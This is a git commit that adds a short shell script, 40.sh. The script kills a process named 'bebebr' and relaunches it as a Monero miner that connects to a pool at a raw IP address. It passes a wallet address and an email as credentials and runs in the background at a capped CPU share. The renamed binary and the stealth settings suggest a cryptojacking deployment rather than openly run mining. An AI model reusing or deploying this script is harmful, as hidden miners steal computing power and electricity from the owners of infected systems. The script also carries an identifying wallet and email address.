de6e8f1e762b3a389841f973c921d05a625090fe
duplo1 <46064321+duplo1@users.noreply.github.com>
2019-06-05 05:21:10 -0400

    Add files via upload

---
+++ 40.sh
@@ -0,0 +1,3 @@
+pkill bebebr
+sleep 7
+bebebr -o 95.216.159.39:3232 -u 44X3tNzFXwZet6y87T1R61gqzBZ9f4yMH9ur4baLxTeEDnfkyJKqRcTEtkqXMfZ6BhTqB8jgYSP5YRbtjAEHRjeqBozqe29 --pass=12:kotminkot@yandex.ru --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=50 --av=1 --variant -1
